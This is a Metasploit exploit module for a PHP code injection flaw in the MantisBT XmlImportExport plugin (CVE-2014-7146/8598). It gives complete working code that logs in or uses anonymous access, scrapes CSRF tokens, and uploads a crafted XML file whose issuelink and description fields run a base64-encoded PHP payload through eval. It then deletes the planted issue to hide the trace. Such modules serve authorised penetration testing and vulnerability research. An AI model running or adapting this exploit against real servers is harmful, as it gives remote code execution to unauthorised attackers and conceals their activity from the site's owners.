# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking
 
  include Msf::Exploit::Remote::HttpClient
  include REXML
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a post-auth vulnerability found in MantisBT versions 1.2.0a3 up to 1.2.17 when the Import/Export plugin is installed.
        This allows a remote authenticated attacker to execute arbitrary PHP code on the remote machine.
        This version also suffers from another issue. The import page is not checking the correct user level
        of the user, so it&#039;s possible to exploit this issue with any user including the anonymous one if enabled.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Egidio Romano&#039;, # discovery http://karmainsecurity.com
          &#039;Juan Escobar <eng.jescobar[at]gmail.com>&#039;, # module development @itsecurityco
          &#039;Christian Mehlmauer&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-7146&#039;],
          [&#039;CVE&#039;, &#039;2014-8598&#039;],
          [&#039;URL&#039;, &#039;https://www.mantisbt.org/bugs/view.php?id=17725&#039;],
          [&#039;URL&#039;, &#039;https://www.mantisbt.org/bugs/view.php?id=17780&#039;]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;Generic (PHP Payload)&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Nov 8 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Username to authenticate as&#039;, &#039;administrator&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;Pasword to authenticate as&#039;, &#039;root&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base directory path&#039;, &#039;/&#039;])
      ], self.class)
  end
 
  def get_mantis_version
    xml = Document.new
    xml.add_element(
    "soapenv:Envelope",
    {
      &#039;xmlns:xsi&#039;     => "http://www.w3.org/2001/XMLSchema-instance",
      &#039;xmlns:xsd&#039;     => "http://www.w3.org/2001/XMLSchema",
      &#039;xmlns:soapenv&#039; => "http://schemas.xmlsoap.org/soap/envelope/",
      &#039;xmlns:man&#039;     => "http://futureware.biz/mantisconnect"
    })
    xml.root.add_element("soapenv:Header")
    xml.root.add_element("soapenv:Body")
    body = xml.root.elements[2]
    body.add_element("man:mc_version",
      { &#039;soapenv:encodingStyle&#039; => "http://schemas.xmlsoap.org/soap/encoding/" }
    )
 
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;api&#039;, &#039;soap&#039;, &#039;mantisconnect.php&#039;),
      &#039;ctype&#039;    => &#039;text/xml; charset=UTF-8&#039;,
      &#039;headers&#039;  => { &#039;SOAPAction&#039; => &#039;http://www.mantisbt.org/bugs/api/soap/mantisconnect.php/mc_version&#039;},
      &#039;data&#039;     => xml.to_s
    })
    if res && res.code == 200
      match = res.body.match(/<ns1:mc_versionResponse.*><return xsi:type="xsd:string">(.+)<\/return><\/ns1:mc_versionResponse>/)
      if match && match.length == 2
        version = match[1]
        print_status("Detected Mantis version #{version}")
        return version
      end
    end
 
    print_status("Can not detect Mantis version")
    return nil
  end
 
  def check
    version = get_mantis_version
 
    return Exploit::CheckCode::Unknown if version.nil?
 
    gem_version = Gem::Version.new(version)
    gem_version_introduced = Gem::Version.new(&#039;1.2.0a3&#039;)
    gem_version_fixed = Gem::Version.new(&#039;1.2.18&#039;)
 
    if gem_version < gem_version_fixed && gem_version >= gem_version_introduced
      return Msf::Exploit::CheckCode::Appears
    else
      return Msf::Exploit::CheckCode::Safe
    end
  end
 
  def do_login()
    # check for anonymous login
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;login_anon.php&#039;)
    })
    # if the redirect contains a username (non empty), anonymous access is enabled
    if res && res.redirect? && res.redirection && res.redirection.query =~ /username=[^&]+/
      print_status(&#039;Anonymous access enabled, no need to log in&#039;)
      session_cookie = res.get_cookies
    else
      res = send_request_cgi({
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;login_page.php&#039;),
        &#039;vars_get&#039; => {
          &#039;return&#039;  => normalize_uri(target_uri.path, &#039;plugin.php?page=XmlImportExport/import&#039;)
        }
      })
      session_cookie = res.get_cookies
      print_status(&#039;Logging in...&#039;)
      res = send_request_cgi({
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;login.php&#039;),
        &#039;cookie&#039;    => session_cookie,
        &#039;vars_post&#039; => {
          &#039;return&#039;  => normalize_uri(target_uri.path, &#039;plugin.php?page=XmlImportExport/import&#039;),
          &#039;username&#039; => datastore[&#039;username&#039;],
          &#039;password&#039; => datastore[&#039;password&#039;],
          &#039;secure_session&#039; => &#039;on&#039;
        }
      })
      fail_with(Failure::NoAccess, &#039;Login failed&#039;) unless res && res.code == 302
 
      fail_with(Failure::NoAccess, &#039;Wrong credentials&#039;) unless res && !res.redirection.to_s.include?(&#039;login_page.php&#039;)
 
      session_cookie = "#{session_cookie} #{res.get_cookies}"
    end
 
    session_cookie
  end
 
  def upload_xml(payload_b64, rand_text, cookies, is_check)
 
    if is_check
      timeout = 20
    else
      timeout = 3
    end
 
    rand_num = Rex::Text.rand_text_numeric(1, 9)
 
    print_status(&#039;Checking XmlImportExport plugin...&#039;)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;plugin.php&#039;),
      &#039;cookie&#039;   => cookies,
      &#039;vars_get&#039; => {
        &#039;page&#039; => &#039;XmlImportExport/import&#039;
      }
    })
 
    unless res && res.code == 200 && res.body
      print_error(&#039;Error trying to access XmlImportExport/import page...&#039;)
      return false
    end
 
    if res.body.include?(&#039;Plugin is not registered with MantisBT&#039;)
      print_error(&#039;XMLImportExport plugin is not installed&#039;)
      return false
    end
 
    # Retrieving CSRF token
    if res.body =~ /name="plugin_xml_import_action_token" value="(.*)"/
      csrf_token = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to read CSRF token&#039;)
      return false
    end
 
    # Retrieving default project id
    if res.body =~ /name="project_id" value="([0-9]+)"/
      project_id = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to read project id&#039;)
      return false
    end
 
    # Retrieving default category id
    if res.body =~ /name="defaultcategory">[.|\r|\r\n]*<option value="([0-9])" selected="selected" >\(select\)<\/option><option value="1">\[All Projects\] (.*)<\/option>/
      category_id = Regexp.last_match[1]
      category_name = Regexp.last_match[2]
    else
      print_error(&#039;Error trying to read default category&#039;)
      return false
    end
 
    # Retrieving default max file size
    if res.body =~ /name="max_file_size" value="([0-9]+)"/
      max_file_size = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to read default max file size&#039;)
      return false
    end
 
    # Retrieving default step
    if res.body =~ /name="step" value="([0-9]+)"/
      step = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to read default step value&#039;)
      return false
    end
 
    xml_file =   %Q|
    <mantis version="1.2.17" urlbase="http://localhost/" issuelink="${eval(base64_decode(#{ payload_b64 }))}}" notelink="~" format="1">
        <issue>
            <id>#{ rand_num }</id>
            <project id="#{ project_id }">#{ rand_text }</project>
            <reporter id="#{ rand_num }">#{ rand_text }</reporter>
            <priority id="30">normal</priority>
            <severity id="50">minor</severity>
            <reproducibility id="70">have not tried</reproducibility>
            <status id="#{ rand_num }">new</status>
            <resolution id="#{ rand_num }">open</resolution>
            <projection id="#{ rand_num }">none</projection>
            <category id="#{ category_id }">#{ category_name }</category>
            <date_submitted>1415492267</date_submitted>
            <last_updated>1415507582</last_updated>
            <eta id="#{ rand_num }">none</eta>
            <view_state id="#{ rand_num }">public</view_state>
            <summary>#{ rand_text }</summary>
            <due_date>1</due_date>
            <description>{${eval(base64_decode(#{ payload_b64 }))}}1</description>
        </issue>
    </mantis>
    |
 
    data = Rex::MIME::Message.new
    data.add_part("#{ csrf_token }", nil, nil, "form-data; name=\"plugin_xml_import_action_token\"")
    data.add_part("#{ project_id }", nil, nil, "form-data; name=\"project_id\"")
    data.add_part("#{ max_file_size }", nil, nil, "form-data; name=\"max_file_size\"")
    data.add_part("#{ step }", nil, nil, "form-data; name=\"step\"")
    data.add_part(xml_file, "text/xml", "UTF-8", "form-data; name=\"file\"; filename=\"#{ rand_text }.xml\"")
    data.add_part("renumber", nil, nil, "form-data; name=\"strategy\"")
    data.add_part("link", nil, nil, "form-data; name=\"fallback\"")
    data.add_part("on", nil, nil, "form-data; name=\"keepcategory\"")
    data.add_part("#{ category_id }", nil, nil, "form-data; name=\"defaultcategory\"")
    data_post = data.to_s
 
    print_status(&#039;Sending payload...&#039;)
    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, &#039;plugin.php?page=XmlImportExport/import_action&#039;),
      &#039;cookie&#039; => cookies,
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{ data.bound }",
      &#039;data&#039;    => data_post
    }, timeout)
 
    if res && res.body && res.body.include?(&#039;APPLICATION ERROR&#039;)
      print_error(&#039;Error on uploading XML&#039;)
      return false
    end
 
    # request above will time out and return nil on success
    return true
  end
 
  def exec_php(php_code, is_check = false)
    print_status(&#039;Checking access to MantisBT...&#039;)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path)
    })
 
    fail_with(Failure::NoAccess, &#039;Error accessing MantisBT&#039;) unless res && (res.code == 200 || res.redirection)
 
    # remove comments, line breaks and spaces of php_code
    payload_clean = php_code.gsub(/(\s+)|(#.*)/, &#039;&#039;)
 
    # clean b64 payload
    while Rex::Text.encode_base64(payload_clean).include?(&#039;=&#039;)
      payload_clean = "#{ payload_clean } "
    end
    payload_b64 = Rex::Text.encode_base64(payload_clean)
 
    rand_text = Rex::Text.rand_text_alpha(5, 8)
 
    cookies = do_login()
 
    res_payload = upload_xml(payload_b64, rand_text, cookies, is_check)
 
    return unless res_payload
 
    # Must login again in order to recover the communication. Thanks to @FireFart for figure out how to fix it.
    cookies = do_login()
 
    print_status("Deleting issue (#{ rand_text })...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;my_view_page.php&#039;),
      &#039;cookie&#039; => cookies
    })
 
    unless res && res.code == 200
      print_error(&#039;Error trying to access My View page&#039;)
      return false
    end
 
    if res.body =~ /title="\[@[0-9]+@\] #{ rand_text }">0+([0-9]+)<\/a>/
      issue_id = Regexp.last_match[1]
     else
      print_error(&#039;Error trying to retrieve issue id&#039;)
      return false
    end
 
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;bug_actiongroup_page.php&#039;),
      &#039;cookie&#039;   => cookies,
      &#039;vars_get&#039; => {
        &#039;bug_arr[]&#039; => issue_id,
        &#039;action&#039; => &#039;DELETE&#039;,
      },
    })
 
    if res && res.body =~ /name="bug_actiongroup_DELETE_token" value="(.*)"\/>/
      csrf_token = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to retrieve CSRF token&#039;)
      return false
    end
 
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;bug_actiongroup.php&#039;),
      &#039;cookie&#039;   => cookies,
      &#039;vars_post&#039; => {
        &#039;bug_actiongroup_DELETE_token&#039; => csrf_token,
        &#039;bug_arr[]&#039; => issue_id,
        &#039;action&#039; => &#039;DELETE&#039;,
      },
    })
 
    if res && res.code == 302 || res.body !~ /Issue #{ issue_id } not found/
      print_status("Issue number (#{ issue_id }) removed")
    else
      print_error("Removing issue number (#{ issue_id }) has failed")
      return false
    end
 
    # if check return the response
    if is_check
      return res_payload
    else
      return true
    end
  end
 
  def exploit
    get_mantis_version
    unless exec_php(payload.encoded)
      fail_with(Failure::Unknown, &#039;Exploit failed, aborting.&#039;)
    end
  end
end

